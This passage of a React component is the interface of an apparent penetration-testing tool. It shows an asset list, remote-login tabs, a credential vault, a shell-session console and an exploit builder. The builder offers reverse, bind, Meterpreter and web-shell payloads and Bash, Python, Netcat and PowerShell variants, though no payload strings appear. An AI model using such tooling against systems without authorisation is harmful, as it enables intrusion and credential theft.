                <div className="text-cyber-blue animate-pulse text-xs">Loading assets...</div>
              </div>
            ) : getFilteredAssets().length === 0 ? (
              <div className="flex items-center justify-center h-full">
                <div className="text-center">
                  <div className="text-4xl mb-2 opacity-20">◈</div>
                  <p className="text-cyber-gray-light text-xs">No assets found</p>
                </div>
              </div>
            ) : (
              <div className="divide-y divide-cyber-gray">
                {getFilteredAssets().map(asset => (
                  <div
                    key={asset.id}
                    onClick={() => handleAssetClick(asset)}
                    className={`p-4 cursor-pointer transition-all border-l-4 ${
                      selectedAsset?.id === asset.id
                        ? accessMode === 'login'
                          ? 'border-l-cyber-green bg-cyber-darker'
                          : 'border-l-cyber-red bg-cyber-darker'
                        : 'border-l-transparent hover:bg-cyber-dark hover:border-l-cyber-purple'
                    }`}
                  >
                    <div className="grid grid-cols-[auto_1fr_auto] gap-4 items-start">
                      {/* Left: Selection Indicator + IP */}
                      <div className="flex items-center space-x-2 min-w-[140px]">
                        {selectedAsset?.id === asset.id && (
                          <span className={accessMode === 'login' ? 'text-cyber-green' : 'text-cyber-red'}>◉</span>
                        )}
                        <div>
                          <h4 className={`font-bold text-sm font-mono ${selectedAsset?.id === asset.id ? (accessMode === 'login' ? 'text-cyber-green' : 'text-cyber-red') : 'text-cyber-blue'}`}>
                            {asset.ip_address}
                          </h4>
                          {asset.hostname && asset.hostname !== asset.ip_address && (
                            <span className="text-cyber-gray-light text-[10px] block">{asset.hostname}</span>
                          )}
                          <span className="text-cyber-gray-light text-[10px]">
                            OS: <span className="text-cyber-green">{asset.os_name || 'Unknown'}</span>
                          </span>
                        </div>
                      </div>

                      {/* Center: Ports */}
                      <div>
                        {asset.services && Object.keys(asset.services).length > 0 ? (
                          <div className="flex flex-col gap-1">
                            {Object.keys(asset.services).slice(0, 4).map(port => (
                              <span
                                key={port}
                                className="px-2 py-0.5 bg-cyber-darker border border-cyber-blue text-cyber-blue rounded text-xs inline-block w-fit"
                                title={`${asset.services?.[port]?.service || 'Unknown'} on port ${port}`}
                              >
                                {getServiceIcon(asset.services?.[port]?.service || '')} {port}
                              </span>
                            ))}
                            {Object.keys(asset.services).length > 4 && (
                              <span className="text-cyber-gray text-xs">+{Object.keys(asset.services).length - 4} more</span>
                            )}
                          </div>
                        ) : (
                          <span className="text-cyber-gray text-xs">No services detected</span>
                        )}
                      </div>

                      {/* Right: Status Badges */}
                      <div className="flex flex-col items-end gap-1.5 min-w-[100px]">
                        {asset.has_been_accessed && (
                          <span className="px-2 py-1 text-[10px] border border-cyber-green text-cyber-green rounded font-bold uppercase shadow-[0_0_3px_#00ff41] whitespace-nowrap">
                            ◈ LOGIN
                          </span>
                        )}
                        {asset.has_been_exploited && (
                          <span className="px-2 py-1 text-[10px] border border-cyber-red text-cyber-red rounded font-bold uppercase shadow-[0_0_3px_#ff0040] whitespace-nowrap">
                            ◆ EXPLOIT
                          </span>
                        )}
                        {(asset.vulnerable_count || 0) > 0 && (
                          <span className="px-2 py-1 text-[10px] border border-cyber-red text-cyber-red rounded font-bold uppercase shadow-[0_0_3px_#ff0040] whitespace-nowrap">
                            ⚠ {asset.vulnerable_count} VULN
                          </span>
                        )}
                        {(asset.open_ports?.length || 0) > 0 && (
                          <span className="px-2 py-1 text-[10px] border border-cyber-green text-cyber-green rounded font-bold uppercase opacity-60 whitespace-nowrap">
                            {asset.open_ports?.length} PORTS
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
          </div>

          {/* Right Side - Connection/Exploit Area */}
          <div className={`flex-1 bg-cyber-darker border border-cyber-gray rounded-lg overflow-hidden flex flex-col ${isFullscreen ? 'fixed inset-0 z-50' : ''}`}>
          {accessMode === 'login' ? (
            /* Login Mode - Show Active Connections */
            <>
              {/* Tabs Header */}
              <div className="flex border-b border-cyber-gray overflow-x-auto custom-scrollbar bg-cyber-dark">
                {tabs.map(tab => (
                  <div 
                    key={tab.id}
                    className={`flex items-center space-x-2 px-4 py-2 cursor-pointer border-t border-x transition-all ${
                      activeTabId === tab.id 
                        ? 'bg-cyber-darker border-cyber-green text-cyber-green' 
                        : 'bg-cyber-dark border-transparent text-cyber-gray-light hover:bg-cyber-darker'
                    }`}
                    onClick={() => setActiveTab(tab.id)}
                  >
                    <span className="text-xs font-mono uppercase">{tab.protocol}</span>
                    <span className="text-sm font-bold">{tab.hostname || tab.ip}</span>
                    <button 
                      onClick={(e) => {
                        e.stopPropagation();
                        removeTab(tab.id);
                      }}
                      className="hover:text-cyber-red ml-2"
                    >
                      &times;
                    </button>
                  </div>
                ))}
              </div>

              {/* Connection Content */}
              <div className="flex-1 overflow-hidden" style={!isFullscreen ? { height: `${connectionHeight}px` } : undefined}>
                {activeTab ? (
                  <div className="h-full flex flex-col">
                    <div className="p-4 border-b border-cyber-gray bg-cyber-dark flex justify-between items-center">
                      <div className="flex items-center space-x-4">
                        <span className="text-cyber-green font-bold uppercase text-xs">Target: {activeTab.ip}</span>
                        <span className={`text-xs font-bold uppercase px-2 py-0.5 border ${
                          activeTab.status === 'connected' ? 'border-cyber-green text-cyber-green' :
                          activeTab.status === 'connecting' ? 'border-cyber-blue text-cyber-blue animate-pulse' :
                          'border-cyber-gray text-cyber-gray'
                        }`}>
                          {activeTab.status}
                        </span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <button
                          onClick={toggleFullscreen}
                          className="text-cyber-gray-light hover:text-cyber-blue transition-colors p-1"
                          title={isFullscreen ? "Exit Fullscreen" : "Fullscreen"}
                        >
                          {isFullscreen ? (
                            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                            </svg>
                          ) : (
                            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4" />
                            </svg>
                          )}
                        </button>
                      </div>
                    </div>
                    <div className="flex-1 p-6 overflow-auto">
                      <ProtocolConnection key={activeTab.id} tab={activeTab} />
                    </div>
                    {!isFullscreen && (
                      <div
                        className="h-1 bg-cyber-gray hover:bg-cyber-blue cursor-ns-resize transition-colors"
                        onMouseDown={handleMouseDown}
                      >
                        <div className="absolute left-1/2 -translate-x-1/2 w-12 h-1 bg-cyber-blue rounded-full"></div>
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="h-full flex items-center justify-center">
                    <div className="text-center space-y-4">
                      <div className="text-cyber-gray opacity-20">
                        <svg className="w-24 h-24 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                        </svg>
                      </div>
                      <p className="text-cyber-gray-light font-mono uppercase tracking-widest">No Active Connections</p>
                      <p className="text-xs text-cyber-gray">Select an asset and click to connect</p>
                    </div>
                  </div>
                )}
              </div>
            </>
          ) : (
            /* Exploit Mode - Show Console and Builder */
            <div className="h-full flex flex-col">
              {/* Shell Console */}
              <div className="flex-1 flex flex-col overflow-hidden">
                <div className="p-4 border-b border-cyber-gray bg-cyber-dark">
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="text-cyber-red font-bold uppercase text-sm flex items-center">
                        <span className="mr-2">▣</span>
                        Shell Console
                      </h3>
                      {activeSessionId && (() => {
                        const session = shellSessions.find(s => s.id === activeSessionId);
                        return session ? (
                          <div className="flex items-center space-x-4 text-xs mt-2">
                            <span className="text-cyber-blue">
                              Session: {session.target_ip}:{session.target_port}
                            </span>
                            <span className="text-cyber-gray-light">
                              Commands: {session.commands_executed}
                            </span>
                            <span className="text-cyber-gray-light">
                              Status: <span className={session.status === 'connected' ? 'text-cyber-green' : 'text-cyber-red'}>
                                {session.status.toUpperCase()}
                              </span>
                            </span>
                          </div>
                        ) : null;
                      })()}
                    </div>
                    
                    {/* Session Tabs */}
                    {shellSessions.length > 0 && (
                      <div className="flex items-center space-x-2">
                        {shellSessions.map(session => (
                          <div
                            key={session.id}
                            className={`flex items-center space-x-2 px-3 py-1 border rounded cursor-pointer ${
                              activeSessionId === session.id
                                ? 'border-cyber-green text-cyber-green'
                                : 'border-cyber-gray text-cyber-gray hover:border-cyber-green'
                            }`}
                            onClick={() => setActiveSession(session.id)}
                          >
                            <span className={`w-2 h-2 rounded-full ${
                              session.status === 'connected' ? 'bg-cyber-green animate-pulse' :
                              session.status === 'connecting' ? 'bg-cyber-blue animate-pulse' :
                              session.status === 'failed' ? 'bg-cyber-red' :
                              'bg-cyber-gray'
                            }`} />
                            <span className="text-xs font-mono">{session.target_ip}</span>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                handleCloseSession(session.id);
                              }}
                              className="text-cyber-red hover:text-white ml-1"
                            >
                              ×
                            </button>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
                
                {/* Console Area */}
                <div className="flex-1 flex flex-col bg-black text-green-500 font-mono p-4 text-sm overflow-hidden">
                  {shellSessions.length === 0 ? (
                    <div className="flex items-center justify-center h-full">
                      <div className="text-center">
                        <div className="text-6xl mb-4 opacity-20">💻</div>
                        <p className="text-cyber-gray-light">No active shell sessions</p>
                        <p className="text-xs text-cyber-gray mt-2">Build and execute an exploit to start a session</p>
                      </div>
                    </div>
                  ) : (
                    <>
                      <div className="flex-1 overflow-auto custom-scrollbar mb-4 space-y-1">
                        {output.map((line, i) => (
                          <div key={i} className="whitespace-pre-wrap break-all">
                            {line.startsWith('[+]') && <span className="text-cyber-green">{line}</span>}
                            {line.startsWith('[*]') && <span className="text-cyber-blue">{line}</span>}
                            {line.startsWith('[!]') && <span className="text-cyber-red">{line}</span>}
                            {!line.startsWith('[') && line}
                          </div>
                        ))}
                        <div ref={terminalEndRef} />
                      </div>
                      
                      {activeSessionId && shellSessions.find(s => s.id === activeSessionId)?.status === 'connected' && (
                        <form onSubmit={handleSendCommand} className="flex items-center space-x-2 border-t border-cyber-gray pt-4">
                          <span className="text-cyber-red font-bold">#</span>
                          <input
                            type="text"
                            value={command}
                            onChange={(e) => setCommand(e.target.value)}
                            className="flex-1 bg-transparent border-none outline-none text-green-500"
                            placeholder="Enter command..."
                            autoFocus
                          />
                        </form>
                      )}
                    </>
                  )}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
      </div>

      {/* Vault Sidebar */}
      {showVault && (
        <div className="w-80 bg-cyber-darker border-l border-cyber-purple flex flex-col">
          <div className="p-4 border-b border-cyber-gray bg-cyber-dark">
            <div className="flex justify-between items-center mb-2">
              <h3 className="text-lg font-bold text-cyber-purple uppercase tracking-wider">◈ VAULT</h3>
              <button 
                onClick={() => setShowVault(false)}
                className="text-cyber-gray hover:text-cyber-red transition-colors text-xl"
              >
                ×
              </button>
            </div>
            {isVaultUnlocked && (
              <button 
                onClick={handleVaultLock}
                className="text-xs text-cyber-gray hover:text-cyber-red transition-colors"
              >
                ◆ Lock Vault
              </button>
            )}
          </div>

          {!isVaultUnlocked ? (
            <div className="flex-1 flex items-center justify-center p-6">
              <div className="w-full space-y-4">
                <div className="text-center mb-6">
                  <div className="text-6xl mb-4 text-cyber-gray">◆</div>
                  <p className="text-cyber-gray-light text-sm">Vault Locked</p>
                </div>
                <div>
                  <label className="block text-xs text-cyber-gray-light mb-1">Enter Password</label>
                  <input
                    type="password"
                    name="nop-vault-password"
                    autoComplete="new-password"
                    value={vaultPassword}
                    onChange={(e) => setVaultPassword(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleVaultUnlock()}
                    className="w-full bg-cyber-darker border border-cyber-purple rounded px-3 py-2 text-white text-sm font-mono focus:border-cyber-purple outline-none placeholder-cyber-gray"
                    placeholder="Enter vault password"
                  />
                </div>
                <button
                  onClick={handleVaultUnlock}
                  className="w-full btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black py-2 font-bold uppercase text-sm"
                >
                  ◆ Unlock Vault
                </button>
              </div>
            </div>
          ) : (
            <div className="flex-1 overflow-y-auto p-4 space-y-3">
              <div className="space-y-2 mb-4">
                <div className="flex items-center justify-between">
                  <span className="text-xs text-cyber-gray-light">Sort by:</span>
                  <div className="flex space-x-1">
                    <button
                      onClick={() => setVaultSortBy('recent')}
                      className={`btn-base btn-sm ${vaultSortBy === 'recent' ? 'btn-purple' : 'btn-gray'}`}
                    >
                      Recent
                    </button>
                    <button
                      onClick={() => setVaultSortBy('frequent')}
                      className={`btn-base btn-sm ${vaultSortBy === 'frequent' ? 'btn-purple' : 'btn-gray'}`}
                    >
                      Frequent
                    </button>
                    <button
                      onClick={() => setVaultSortBy('name')}
                      className={`btn-base btn-sm ${vaultSortBy === 'name' ? 'btn-purple' : 'btn-gray'}`}
                    >
                      Name
                    </button>
                  </div>
                </div>
              </div>
              {vaultCredentials.length === 0 ? (
                <div className="text-center py-8">
                  <p className="text-cyber-gray-light text-sm mb-2">No credentials saved</p>
                  <p className="text-xs text-cyber-gray">Connect to an asset to add it to your vault</p>
                </div>
              ) : (
                vaultCredentials.map(cred => (
                  <div 
                    key={cred.id}
                    className="bg-cyber-dark border border-cyber-gray hover:border-cyber-blue rounded p-3 transition-all group relative"
                    onMouseEnter={() => setHoveredCredId(cred.id)}
                    onMouseLeave={() => setHoveredCredId(null)}
                  >
                    <button
                      onClick={(e) => {
                        e.stopPropagation();
                        handleRemoveCredential(cred.id);
                      }}
                      className="absolute top-2 right-2 text-cyber-gray hover:text-cyber-red transition-colors opacity-0 group-hover:opacity-100"
                      title="Remove from vault"
                    >
                      <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                      </svg>
                    </button>
                    <div className="flex items-start justify-between mb-2 pr-6">
                      <div className="flex-1">
                        <p className="text-cyber-blue font-bold text-sm">{cred.hostname || cred.host}</p>
                        <p className={`text-xs transition-all ${hoveredCredId === cred.id ? 'text-cyber-green cyber-glow' : 'text-cyber-gray-light'}`}>
                          {cred.host}
                        </p>
                      </div>
                      <span className={`text-xs px-2 py-0.5 border rounded uppercase ${getProtocolColor(cred.protocol)}`}>
                        {cred.protocol}
                      </span>
                    </div>
                    <p className="text-xs text-cyber-green mb-2">◉ {cred.username}</p>
                    <div className="flex justify-between items-center text-xs text-cyber-gray">
                      <span>Last: {cred.lastUsed}</span>
                      <span>Uses: {cred.useCount}</span>
                    </div>
                    <button 
                      onClick={(e) => {
                        e.stopPropagation();
                        handleQuickConnect(cred.host, cred.protocol as Protocol, cred.hostname);
                      }}
                      className="w-full mt-2 btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black py-1 text-xs opacity-0 group-hover:opacity-100 transition-opacity"
                    >
                      ◆ Connect Now ►
                    </button>
                  </div>
                ))
              )}
            </div>
          )}
        </div>
      )}

      {/* Login Modal */}
      {showLoginModal && selectedAsset && (
        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
          <div className="bg-cyber-darker border border-cyber-gray rounded-lg w-96 overflow-hidden">
            {/* Modal Header */}
            <div className="bg-cyber-dark border-b border-cyber-gray px-4 py-3 flex items-center justify-between">
              <h3 className="text-sm font-bold text-cyber-green uppercase tracking-wider flex items-center">
                <span className="mr-2">◉</span>
                Login to {selectedAsset.ip_address}
              </h3>
              <button
                onClick={() => {
                  setShowLoginModal(false);
                  setSelectedService(null);
                }}
                className="text-cyber-gray hover:text-cyber-red text-xl leading-none"
              >
                ×
              </button>
            </div>
            
            {/* Modal Content */}
            <div className="p-4 space-y-4">
              {/* Port Display - Always show */}
              <div className="bg-cyber-dark border border-cyber-gray rounded p-3">
                <p className="text-xs text-cyber-gray-light mb-2 uppercase tracking-wide font-bold">◆ Detected Port(s)</p>
                {selectedAsset.services && Object.keys(selectedAsset.services).length > 0 ? (
                  <div className="flex flex-wrap gap-2">
                    {Object.entries(selectedAsset.services).map(([port, serviceData]) => (
                      <span key={port} className="px-2 py-1 bg-cyber-darker border border-cyber-blue text-cyber-blue rounded text-xs font-mono">
                        ◈ {port} {serviceData.service ? `[${serviceData.service.toUpperCase()}]` : ''}
                      </span>
                    ))}
                  </div>
                ) : (
                  <p className="text-xs text-cyber-gray italic">◇ No ports detected - manual selection required</p>
                )}
              </div>
              
              {/* Protocol Selection - Always show for manual selection */}
              <div>
                <label className="block text-xs text-cyber-gray-light mb-2 uppercase tracking-wide font-bold">◆ Select Protocol</label>
                <select
                  value={selectedProtocol}
                  onChange={(e) => setSelectedProtocol(e.target.value as Protocol)}
                  className="w-full bg-cyber-dark border border-cyber-gray rounded px-3 py-2 text-white text-sm font-mono focus:border-cyber-green outline-none"
                >
                  <option value="ssh" className="bg-cyber-dark">◉ SSH - Secure Shell</option>
                  <option value="rdp" className="bg-cyber-dark">◉ RDP - Remote Desktop</option>
                  <option value="vnc" className="bg-cyber-dark">◉ VNC - Virtual Network</option>
                  <option value="telnet" className="bg-cyber-dark">◉ TELNET - Terminal</option>
                  <option value="ftp" className="bg-cyber-dark">◉ FTP - File Transfer</option>
                  <option value="web" className="bg-cyber-dark">◉ WEB - HTTP Interface</option>
                </select>
              </div>
            </div>
            
            {/* Modal Footer */}
            <div className="bg-cyber-dark border-t border-cyber-gray px-4 py-3 flex space-x-2">
              <button
                onClick={handleLogin}
                className="flex-1 btn-cyber border-cyber-green text-cyber-green hover:bg-cyber-green hover:text-black py-2 font-bold uppercase text-sm"
              >
                ◉ Login
              </button>
              <button
                onClick={() => {
                  setShowLoginModal(false);
                  setSelectedService(null);
                }}
                className="flex-1 btn-cyber border-cyber-gray text-cyber-gray hover:border-cyber-red hover:text-cyber-red py-2 font-bold uppercase text-sm"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Exploit Builder Panel */}
      {showExploitBuilder && accessMode === 'exploit' && (
        <>
          {/* Overlay */}
          <div 
            className="fixed inset-0 bg-black bg-opacity-50 z-40"
            onClick={() => setShowExploitBuilder(false)}
          />
          
          {/* Sliding Panel */}
          <div className="fixed right-0 top-0 h-full w-full md:w-3/5 lg:w-2/5 bg-cyber-darker border-l border-cyber-red z-50 overflow-y-auto animate-slideIn">
            {/* Panel Header */}
            <div className="sticky top-0 bg-cyber-dark border-b border-cyber-red p-4 flex items-center justify-between z-10">
              <div>
                <h3 className="text-cyber-red font-bold uppercase text-sm flex items-center">
                  <span className="mr-2">◆</span>
                  Exploit Module Builder
                </h3>
                {selectedAsset && (
                  <p className="text-xs text-cyber-blue mt-1">
                    Target: {selectedAsset.ip_address} ({selectedAsset.hostname || 'Unknown'})
                  </p>
                )}
              </div>
              <button
                onClick={() => setShowExploitBuilder(false)}
                className="text-cyber-gray hover:text-cyber-red text-2xl leading-none"
              >
                ×
              </button>
            </div>

            {/* Panel Content */}
            <div className="p-4">
              {!selectedAsset ? (
                <div className="flex items-center justify-center h-48">
                  <div className="text-center">
                    <div className="text-4xl mb-2 opacity-20">◆</div>
                    <p className="text-cyber-gray-light text-sm">No target selected</p>
                  </div>
                </div>
              ) : (
                <div className="space-y-3">
                  {/* Vulnerability Info */}
                  {selectedVulnerability && (
                    <div className="bg-cyber-dark border border-cyber-red rounded p-3">
                      <div className="flex items-center space-x-2 mb-1">
                        <span className={`px-2 py-0.5 text-xs font-bold border rounded ${getSeverityColor(selectedVulnerability.severity)}`}>
                          {selectedVulnerability.severity.toUpperCase()}
                        </span>
                        <span className="text-cyber-blue font-mono text-xs">{selectedVulnerability.cve_id}</span>
                      </div>
                      <p className="text-white font-semibold text-sm">{selectedVulnerability.title}</p>
                    </div>
                  )}

                  {/* Exploit Details */}
                  <div className="bg-cyber-dark border border-cyber-gray rounded p-3">
                    <h4 className="text-cyber-blue font-bold uppercase mb-2 text-xs">Exploit Details</h4>
                    <div className="space-y-2">
                      <input
                        type="text"
                        value={exploitName}
                        onChange={(e) => setExploitName(e.target.value)}
                        className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-red outline-none"
                        placeholder="Exploit name"
                      />
                      <textarea
                        value={exploitDescription}
                        onChange={(e) => setExploitDescription(e.target.value)}
                        className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-red outline-none"
                        rows={2}
                        placeholder="Description"
                      />
                    </div>
                  </div>

                  {/* Payload Configuration */}
                  <div className="bg-cyber-dark border border-cyber-gray rounded p-3">
                    <h4 className="text-cyber-red font-bold uppercase mb-2 text-xs">Payload</h4>
                    <div className="space-y-2">
                      <select
                        value={payloadType}
                        onChange={(e) => setPayloadType(e.target.value as any)}
                        className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-red outline-none"
                      >
                        <option value="reverse_shell">Reverse Shell</option>
                        <option value="bind_shell">Bind Shell</option>
                        <option value="meterpreter">Meterpreter</option>
                        <option value="web_shell">Web Shell</option>
                        <option value="custom">Custom</option>
                      </select>

                      {payloadType === 'reverse_shell' && (
                        <select
                          value={payloadVariant}
                          onChange={(e) => setPayloadVariant(e.target.value as any)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-red outline-none"
                        >
                          <option value="bash">Bash</option>
                          <option value="python">Python</option>
                          <option value="perl">Perl</option>
                          <option value="netcat">Netcat</option>
                          <option value="powershell">PowerShell</option>
                        </select>
                      )}

                      <div className="grid grid-cols-2 gap-2">
                        <input
                          type="text"
                          value={listenerIP}
                          onChange={(e) => setListenerIP(e.target.value)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm font-mono focus:border-cyber-red outline-none"
                          placeholder="Listener IP"
                        />
                        <input
                          type="text"
                          value={listenerPort}
                          onChange={(e) => setListenerPort(e.target.value)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm font-mono focus:border-cyber-red outline-none"
                          placeholder="Port"
                        />
                      </div>

                      {payloadType === 'custom' && (
                        <textarea
                          value={customPayload}
                          onChange={(e) => setCustomPayload(e.target.value)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm font-mono focus:border-cyber-red outline-none"
                          rows={4}
                          placeholder="Custom payload..."
                        />
                      )}

                      <div className="bg-cyber-darker border border-cyber-blue rounded p-2">
                        <pre className="text-cyber-green text-xs font-mono whitespace-pre-wrap break-all max-h-32 overflow-auto">
                          {generatePayload() || 'Configure settings...'}
                        </pre>
                      </div>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div className="flex space-x-2">
                    <button
                      onClick={handleBuildExploit}
                      className="flex-1 btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black py-2 text-sm font-bold"
                    >
                      ◈ Build
                    </button>
                    <button
                      onClick={() => {
                        handleExecutePayload();
                        setShowExploitBuilder(false);
                      }}
                      className="flex-1 btn-cyber border-cyber-red text-cyber-red hover:bg-cyber-red hover:text-black py-2 text-sm font-bold"
                    >
                      ◆ Execute
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </>
      )}
    </div>
  );
};

export default Access;
